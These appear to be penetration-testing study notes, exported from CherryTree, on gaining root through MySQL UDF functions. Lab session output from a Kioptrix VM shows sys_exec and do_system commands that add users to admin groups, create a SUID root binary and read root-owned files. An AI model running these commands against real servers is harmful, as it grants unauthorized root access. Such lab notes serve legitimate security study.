<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MySQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># MySQL </h1></strong><br />MySQL can be exploited in a few ways<br /><br /><strong><h2>## UDF Injection</h2></strong><br />With the UDF plugin, <code>mysql</code> can run system commands. <br />If MySQL is running as root, you&#39;ll be able to run commands with root privileges.<br /><br /><code>select sys_exec(&#39;&lt;command&gt;&#39;);</code><br /><br /><strong><h3>### Check for UDF</h3></strong><br />UDF are stored in FUNC table of a mysql database.<br /><code>select * from mysql.func;</code><br /><br /><strong><h3>### Example</h3></strong><br /><div class="codebox"><div class="codebox">john@Kioptrix4:~$&nbsp;mysql&nbsp;-u&nbsp;root<br />Welcome&nbsp;to&nbsp;the&nbsp;MySQL&nbsp;monitor.&nbsp;Commands&nbsp;end&nbsp;with&nbsp;;&nbsp;or&nbsp;\g.<br />Your&nbsp;MySQL&nbsp;connection&nbsp;id&nbsp;is&nbsp;9786<br />Server&nbsp;version:&nbsp;5.0.51a-3ubuntu5.4&nbsp;(Ubuntu)<br /><br />Type&nbsp;&#39;help;&#39;&nbsp;or&nbsp;&#39;\h&#39;&nbsp;for&nbsp;help.&nbsp;Type&nbsp;&#39;\c&#39;&nbsp;to&nbsp;clear&nbsp;the&nbsp;buffer.<br /><br />mysql&gt;&nbsp;<br /><br />mysql&gt;&nbsp;select&nbsp;sys_exec(&#39;usermod&nbsp;-a&nbsp;-G&nbsp;admin&nbsp;john&#39;);<br />+--------------------------------------+<br />|&nbsp;sys_exec(&#39;usermod&nbsp;-a&nbsp;-G&nbsp;admin&nbsp;john&#39;)&nbsp;|<br />+--------------------------------------+<br />|&nbsp;NULL&nbsp;|&nbsp;<br />+--------------------------------------+<br />1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.08&nbsp;sec)<br /><br />mysql&gt;&nbsp;exit<br />Bye<br />john@Kioptrix4:~$&nbsp;sudo&nbsp;su<br />[sudo]&nbsp;password&nbsp;for&nbsp;john:&nbsp;<br />root@Kioptrix4:/home/john#&nbsp;</div></div><br /><br /><strong><h3>### MySQL 4.x/5.0 - Add dynamic library to enable UDF</h3></strong><br /><a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a><br /><br />The exploit code above is a dynamic library that you load into MySQL that gives you a <code>do_system()</code> command, which will execute comamnds as root (if MySQL is running as root)<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.252 - fw_dev<br /><br /><strong>#### How to elevate to root?</strong><br />• Add user to sudo/adm/wheel group<br />   ◇ <code>do_system(&#39;usermod -a -G sudo john&#39;)</code><br />• Compile a SUID rootme binary in /tmp. Change ownership to root, make it executable by everyone, and add a SUID bit <br />   ◇ <code>do_system(&#39;chown root.root /dev/shm/rootme; chmod 777 /dev/shm/rootme; chmod +s /dev/shm/rootme&#39;)</code><br /><br /><strong>#### Read files owned by root</strong><br />Read the file you&#39;re interested in out into a file, change its ownership to a user that control, and then exit mysql and read it.<br /><div class="codebox"><div class="codebox">mysql&gt;&nbsp;select&nbsp;do_system(&#39;id&nbsp;&gt;&nbsp;/tmp/out;&nbsp;chown&nbsp;john.john&nbsp;/tmp/out&#39;);<br />mysql&gt;&nbsp;\!&nbsp;sh<br />sh-2.05b$&nbsp;cat&nbsp;/tmp/out<br />uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root),1(bin),2(daemon),3(sys),4(adm)<br />[...]</div></div><br /><br /></div>
</body>
</html>
